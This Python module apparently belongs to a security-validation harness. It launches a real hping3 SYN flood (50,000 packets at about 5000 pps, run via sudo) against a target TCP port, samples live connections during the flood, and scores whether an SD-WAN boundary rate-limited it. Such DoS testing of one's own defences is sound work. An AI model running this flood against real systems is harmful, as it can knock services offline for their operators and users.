"""SYN Flood (DoS) — tests TCP SYN-flood rate-limit / DoS protection at the boundary.

Same reframe as icmp_flood: the old model measured the *target's* connect-failure
rate during the flood ("did I exhaust its backlog?"), which needs a volume a
single host can't push — so it stalled at "below threshold → control likely
held", really meaning "not enough load". Wrong question for a boundary control.

The question an SD-WAN actually answers is "does the boundary rate-limit/drop a
high-rate SYN flood?" — measurable from one host as a DIFFERENTIAL plus a direct
impact check:

  1. baseline — normal-rate SYN probes (hping3 -S -i 0.2): do my SYNs get
     answered (SYN-ACK/RST) normally?
  2. flood    — high-rate SYN (hping3 -S -c N -i uX, counted so hping3 prints a
     real response ratio): how many of MY high-rate SYNs get answered?
  3. impact   — TCP connect success to the port DURING the flood: did real
     service degrade?

Verdict:
  * connects to the port FAIL during the flood -> PASS/SUCCESS (DoS effective —
    the flood degraded real service; the strongest finding).
  * normal-rate SYNs are answered but the high-rate flood's SYNs are largely
    dropped (loss delta >= 30 pts), or RTT-shaped (>= 6x AND >= 150ms) -> BLOCKED
    (the boundary rate-limited/policed the SYN flood — control held).
  * the high-rate SYN flood is delivered end-to-end -> SUCCESS (the boundary did
    NOT rate-limit SYN flooding — a finding: deploy SYN-flood protection).
  * normal-rate SYNs already fail, or the flood never ran -> NO-RESULT.

needs_root (hping3 raw socket). Live/disruptive — authorised window only. Linux.
"""
import os
import re
import shutil
import socket
import subprocess
import time

BASELINE_COUNT = 15        # normal-rate SYN probes
BASELINE_INTERVAL = "0.2"  # seconds between baseline SYNs (5 pps)
FLOOD_COUNT = 50000        # high-rate SYNs to send
FLOOD_INTERVAL_US = 200    # microseconds between flood SYNs (~5000 pps target)
FLOOD_SECONDS = 12         # wall-clock cap on the flood leg
SAMPLES = 15               # TCP connect samples during the flood (impact check)
LOW_LOSS = 20              # <= this %: that rate's SYNs are "getting answered"
RATE_LIMIT_DELTA = 30      # flood SYN-loss this many points ABOVE baseline => policed
FAIL_THRESHOLD = 30        # % of connects failing DURING the flood => DoS impact
RTT_INFLATION = 6.0        # flood avg RTT >= Nx baseline, AND ...
RTT_ABS_FLOOR = 150.0      # ... >= this many ms absolute => shaping (ignore LAN jitter)
SYN_PORT = int(os.environ.get("HARNESS_SYN_PORT", "80"))

META = {
    "id": "syn_flood",
    "name": "SYN Flood (DoS)",
    "category": "Network Exploitation",
    "test_type": "dos",
    "added": True,   # added after the initial harness set
    "control": "SYN-flood rate-limit / DoS protection",
    "fix": "SD-WAN",
    "mitre": ['T1498.001'],
    "cwe": ['CWE-400'],
    "tactic": 'Impact',
    "requires": ["hping3", "timeout"],
    "needs_root": True,           # hping3 needs a raw socket (root or CAP_NET_RAW)
    "serial": True,               # DoS: must run alone
    "run_last": True,             # a flood can trip anti-DoS rate-limiting/blacklist of
                                  # the source — run after everything else (see icmp_flood)
    "order": 100,                 # DoS tier: without an explicit order (==0) this flood
                                  #   sorted to the FRONT of the deferred tail and ran
                                  #   BEFORE the inline IPS-sig attacks (apache 1 /
                                  #   log4shell 2 / doh 3), so its anti-DoS ban turned
                                  #   them into false INCONCLUSIVE. Run with the other
                                  #   sticky blacklisters, just before icmp_flood (101).
    "os_supported": ["Linux"],
    "ports": [("tcp", SYN_PORT)],
    "port_customizable": True,
    # SUCCESS = DoS effective OR the high-rate SYN flood was delivered end-to-end.
    "success_regex": r"^PASS",
    # BLOCKED = the boundary policed the flood (rate-limit / RTT shaping), or an
    # outright network block. FLOOD-PRIV-ERROR must NOT match (the flood never ran).
    "blocked_regex": r"^BLOCKED-|No route to host|Network is unreachable|host unreachable",
}

_PRIV_ERR = ("operation not permitted", "raw socket", "permission denied",
             "a password is required", "a terminal is required", "sudo:")


def _connect_ok(host, port, timeout=1.5):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def _parse_loss(text):
    m = re.search(r"(\d+(?:\.\d+)?)% packet loss", text or "")
    return float(m.group(1)) if m else None


def _parse_rtt_avg(text):
    m = re.search(r"(?:rtt|round-trip)[^=]*=\s*[\d.]+/([\d.]+)/", text or "")
    return float(m.group(1)) if m else None


def _parse_sent(text):
    """SYNs actually transmitted, from hping3's 'N packets transmitted' line."""
    m = re.search(r"(\d+)\s+packets transmitted", text or "")
    return int(m.group(1)) if m else None


# ATTRIBUTION (mirrors icmp_flood): a flood SYN-loss knee is only a TARGET control if
# the SOURCE actually SENT at ~the target rate. hping3 sends blind — under a boundary
# rate-limit it still transmits at the full rate (only the responses are dropped), so
# a high achieved send-rate + high response-loss = in-path policing. But if the source
# couldn't even SEND the rate (achieved << target), the lost responses are the sender
# saturating its OWN uplink/CPU (self-congestion), NOT the boundary — scoring that
# BLOCKED would credit a control the source never pushed. Require achieved >= this
# fraction of the target send-rate before crediting a loss-delta knee as a control.
try:
    SATURATION_FRAC = min(1.0, max(0.0, float(os.environ.get("HARNESS_SYN_SAT_FRAC") or 0.80)))
except (TypeError, ValueError):
    SATURATION_FRAC = 0.80
TARGET_PPS = 1_000_000 // max(1, FLOOD_INTERVAL_US)   # hping3 -i uX => ~this many pps
# DoS-grade volume floor + operator-declared source uplink (mirror icmp_flood — SD-WANs are
# tuned DIFFERENTLY per site). A reached-rate loss knee is only a confident TARGET control at
# a DoS-grade volume; a LOW-volume knee is ambiguous (a low-threshold policer vs the source's
# own uplink/CPU, indistinguishable from one host) -> INCONCLUSIVE, UNLESS the declared uplink
# has clear headroom below it (then the loss is downstream -> BLOCKED). A SYN is ~40 B on the
# wire (IPv4 20 + TCP 20, no payload).
try:
    MIN_MBPS = max(0, int(os.environ.get("HARNESS_SYN_MIN_MBPS") or 50))
except (TypeError, ValueError):
    MIN_MBPS = 50
try:
    UPLINK_MBPS = max(0, int(os.environ.get("HARNESS_SYN_UPLINK_MBPS") or 0))
except (TypeError, ValueError):
    UPLINK_MBPS = 0
SYN_WIRE_BYTES = 40


def _hping_syn(target, port, count, interval_us, cap_seconds):
    """Counted SYN probe/flood via hping3; returns (loss%, avg_rtt_ms, raw_text).
    Counted (-c) so hping3 prints a real SYN-ACK/RST response ratio."""
    import core
    prefix = (["timeout", str(cap_seconds)] if shutil.which("timeout") else [])
    cmd = prefix + core.sudo_prefix() + [
        "hping3", "-S", "-p", str(port), "-c", str(count),
        "-i", "u%d" % interval_us, target]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=cap_seconds + 10, stdin=subprocess.DEVNULL)
    except subprocess.TimeoutExpired as e:
        txt = (e.output or "") if isinstance(e.output, str) else ""
        return _parse_loss(txt), _parse_rtt_avg(txt), txt + "\n[hit wall-clock cap]"
    out = (p.stdout or "") + (p.stderr or "")
    return _parse_loss(out), _parse_rtt_avg(out), out


def run(target, ctx):
    port = ctx.get_port("syn_flood", SYN_PORT)   # overridable (HARNESS_PORT_SYN / GUI)
    out = [f"# SYN flood vs {target}:{port} — boundary rate-limit test "
           f"(baseline SYN probe vs {FLOOD_COUNT}-SYN high-rate flood + live connect check)"]

    if not shutil.which("hping3"):
        return "\n".join(out) + "\n[ERROR] hping3 not found (install hping3). INCONCLUSIVE"

    # The impact signal is "connects that WORKED before now fail during the flood".
    # If nothing is listening at baseline, every sample would fail for a reason
    # unrelated to the flood -> require the port open first.
    if not _connect_ok(target, port):
        out.append(f"[INCONCLUSIVE] no service listening on {target}:{port} at baseline "
                   "— cannot measure SYN-flood impact. Pick an open service port "
                   "(HARNESS_PORT_SYN / GUI).")
        return "\n".join(out)

    # ---- leg 1: normal-rate SYN baseline (do my SYNs get answered?) -----------
    base_loss, base_rtt, base_txt = _hping_syn(
        target, port, BASELINE_COUNT, int(float(BASELINE_INTERVAL) * 1_000_000),
        BASELINE_COUNT + 10)
    out.append("## baseline (normal-rate SYN)")
    out.append(base_txt.strip())
    out.append(f"baseline: syn_loss={base_loss}%  avg_rtt={base_rtt}ms")

    # ---- leg 2: high-rate SYN flood + concurrent connect sampling ------------
    import core
    prefix = (["timeout", str(FLOOD_SECONDS)] if shutil.which("timeout") else [])
    flood_cmd = prefix + core.sudo_prefix() + [
        "hping3", "-S", "-p", str(port), "-c", str(FLOOD_COUNT),
        "-i", "u%d" % FLOOD_INTERVAL_US, target]
    out.append("## high-rate flood (engine: hping3 -S, counted fast mode)")
    t0 = time.time()
    try:
        flood = subprocess.Popen(flood_cmd, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, text=True,
                                 stdin=subprocess.DEVNULL)
    except FileNotFoundError:
        return "\n".join(out) + "\n[ERROR] hping3 vanished before launch. INCONCLUSIVE"

    time.sleep(1)  # let the flood ramp before sampling real connects
    fails = 0
    for _ in range(SAMPLES):
        if not _connect_ok(target, port):
            fails += 1
        time.sleep(0.3)

    try:
        fout, _ = flood.communicate(timeout=FLOOD_SECONDS + 5)
    except Exception:
        flood.kill()
        fout, _ = flood.communicate()
    elapsed = max(0.001, time.time() - t0)
    out.append((fout or "").strip())

    # Privilege failure regardless of whether a loss% parsed: unprivileged hping3
    # still prints "100% packet loss", which would otherwise be misread as the
    # boundary policing the flood (a FALSE BLOCKED). A priv marker = the flood never ran.
    if fout and any(m in fout.lower() for m in _PRIV_ERR):
        out.append("FLOOD-PRIV-ERROR: hping3 could not run with the privileges it "
                   "needs — the flood never ran. NOT evidence the control works. Fix "
                   "ONE of: setcap cap_net_raw,cap_net_admin+eip $(which hping3); a "
                   "NOPASSWD sudoers rule for hping3; or run as root.")
        return "\n".join(out)

    flood_loss = _parse_loss(fout)
    flood_rtt = _parse_rtt_avg(fout)
    sent = _parse_sent(fout)
    achieved_pps = (sent / elapsed) if sent else None
    connect_fail = 100.0 * fails / SAMPLES
    out.append(f"flood: syn_loss={flood_loss}%  avg_rtt={flood_rtt}ms  "
               f"sent={sent} in ~{elapsed:.1f}s (~{achieved_pps:,.0f} pps achieved vs "
               f"~{TARGET_PPS:,} pps target)  connect_fail_during_flood={connect_fail:.0f}%"
               if achieved_pps is not None else
               f"flood: syn_loss={flood_loss}%  avg_rtt={flood_rtt}ms  "
               f"connect_fail_during_flood={connect_fail:.0f}%")

    # ---- verdict -------------------------------------------------------------
    # 1) direct DoS impact: real connections failed during the flood.
    if connect_fail > FAIL_THRESHOLD:
        out.append(f"PASS: DoS effective — {connect_fail:.0f}% of TCP connects to {port} "
                   "failed during the flood (service degraded; the boundary did not "
                   "absorb it — finding: deploy SYN-flood protection).")
        return "\n".join(out)

    if flood_loss is None:
        out.append("[INCONCLUSIVE] could not parse the flood's SYN response ratio — review raw log.")
        return "\n".join(out)

    base_ok = base_loss is not None and base_loss <= LOW_LOSS
    delta = (flood_loss - base_loss) if base_loss is not None else None
    inflated = (base_rtt and flood_rtt and base_rtt > 0
                and flood_rtt / base_rtt >= RTT_INFLATION and flood_rtt >= RTT_ABS_FLOOR)

    # A near-TOTAL SYN-loss is an anti-DoS blackhole/ban that dropped the WHOLE flood (the
    # "DOS detected" signature), NOT self-congestion — a saturated uplink still gets SOME
    # SYN-ACKs back. When an anti-DoS bans the source mid-flood the achieved rate ALSO
    # collapses, so WITHOUT this override a real block reads as a false self-congestion
    # INCONCLUSIVE (mirror icmp_flood's TOTAL_LOSS_PCT). >= this % => the control dropped it.
    try:
        TOTAL_LOSS_PCT = min(100.0, max(1.0, float(os.environ.get("HARNESS_SYN_TOTAL_LOSS_PCT") or 99)))
    except (TypeError, ValueError):
        TOTAL_LOSS_PCT = 99.0
    total_loss = flood_loss is not None and flood_loss >= TOTAL_LOSS_PCT

    # Attribution (mirror icmp_flood): the discriminator is whether the host PUT THE OFFERED
    # RATE ON THE WIRE. If hping3 transmitted ~the target rate (reached_rate) and the SYN-ACKs
    # were lost, the SYNs LEFT this NIC and were dropped downstream -> the TARGET policed them
    # (BLOCKED) — by DEFAULT, even at a LOW volume (a single host doesn't saturate a remote
    # target at these rates). If the host could NOT transmit the rate (achieved << target) the
    # loss is a LOCAL send bottleneck -> INCONCLUSIVE. A thin-uplink tester overrides the
    # default by DECLARING HARNESS_SYN_UPLINK_MBPS: a knee whose bandwidth is at/above the
    # uplink's usable headroom is then attributed to that uplink -> INCONCLUSIVE.
    achieved_mbps = (achieved_pps * SYN_WIRE_BYTES * 8 / 1e6) if achieved_pps else None
    uplink_saturated = bool(UPLINK_MBPS and achieved_mbps is not None
                            and achieved_mbps >= SATURATION_FRAC * UPLINK_MBPS)
    # reached_rate here means the host actually transmitted ~the target rate (achieved parsed
    # and >= SAT*target); an UNPARSED rate can't prove transmission, so it is NOT reached.
    reached_rate = bool(achieved_pps is not None and achieved_pps >= SATURATION_FRAC * TARGET_PPS)
    low_vol = bool(MIN_MBPS and achieved_mbps is not None and achieved_mbps < MIN_MBPS
                   and not UPLINK_MBPS)
    knee_is_control = total_loss or (not uplink_saturated and reached_rate)
    if achieved_pps is not None:
        achieved_str = f"~{achieved_pps:,.0f} pps / ~{achieved_mbps:,.0f} Mbit/s"
    else:
        achieved_str = "an unparsed send-rate"

    # 2) boundary rate-limited the high-rate SYN stream (differential loss).
    if base_ok and delta is not None and delta >= RATE_LIMIT_DELTA and knee_is_control:
        rate_note = (f"at {achieved_str} sent " if achieved_pps is not None else "")
        assume_note = (("  [ASSUMES the tester uplink exceeds this ~%s Mbit/s — the host put this rate "
                        "on the wire and the SYN-ACKs were dropped downstream. If THIS host's uplink is "
                        "near this bandwidth the loss could be your OWN uplink; set HARNESS_SYN_UPLINK_MBPS"
                        "=<your uplink Mbit/s> to confirm.]" % f"{achieved_mbps:,.0f}") if low_vol else "")
        out.append(
            f"BLOCKED-RATELIMIT: normal-rate SYNs lost {base_loss:.1f}% but the high-rate "
            f"flood lost {flood_loss:.1f}% (+{delta:.0f} pts) {rate_note}— the host transmitted "
            "this rate and the SYN-ACKs were dropped downstream (SYN-flood protection — control "
            "held). [CONFIDENCE: single-source — confirm via the appliance log or --appliance "
            "dual-path that the SD-WAN (not the target's own backlog/SYN-cookie handling) policed "
            "it.]" + assume_note)
    elif base_ok and delta is not None and delta >= RATE_LIMIT_DELTA:
        if uplink_saturated:
            uplink_note = (f"the loss appeared at {achieved_str}, AT/ABOVE the declared uplink's "
                           f"usable headroom ({UPLINK_MBPS} Mbit/s) — the tester's OWN uplink "
                           "saturating, not the target")
        else:
            uplink_note = (f"the host could NOT transmit the target rate (achieved {achieved_str} of "
                           f"~{TARGET_PPS:,} pps) — a LOCAL send bottleneck, so the target was never "
                           "tested at that rate")
        out.append(
            f"[INCONCLUSIVE] flood SYN-loss rose +{delta:.0f} pts but {uplink_note}. "
            "Resolve it (SD-WANs are tuned differently per site): declare HARNESS_SYN_UPLINK_MBPS="
            "<Mbit/s> (a knee with headroom below it then scores BLOCKED), run --appliance dual-path, "
            "read the appliance log, or flood from a host with a known-fat uplink / more sources "
            "(fleet.py).")
    elif base_ok and inflated:
        out.append(
            f"BLOCKED-RATELIMIT: the SYN flood was answered but RTT inflated to "
            f"{flood_rtt:.0f}ms vs {base_rtt:.1f}ms baseline ({flood_rtt / base_rtt:.1f}x, "
            f">= {RTT_ABS_FLOOR:.0f}ms) — the boundary shaped/throttled the SYN flood "
            "(policing — control held).")
    # 3) the high-rate SYN flood sailed through unimpeded.
    elif flood_loss <= LOW_LOSS:
        out.append(
            f"PASS: the high-rate SYN flood was delivered end-to-end ({flood_loss:.1f}% "
            f"loss over {FLOOD_COUNT} SYNs, connects stayed up) — the boundary did NOT "
            "rate-limit SYN flooding (finding: deploy SYN-flood protection on the SD-WAN).")
    elif not base_ok:
        out.append(
            f"[INCONCLUSIVE] even normal-rate SYNs lost {base_loss}% — the path/port is "
            f"unreliable, so the high-rate {flood_loss:.1f}% loss isn't a clean rate-limit "
            "signal. Review raw log.")
    else:
        out.append(
            f"[INCONCLUSIVE] flood {flood_loss:.1f}% SYN-loss vs {base_loss}% baseline, "
            f"connects {connect_fail:.0f}% — ambiguous (boundary rate-limiting OR "
            "insufficient single-host load). Review raw log.")
    return "\n".join(out)
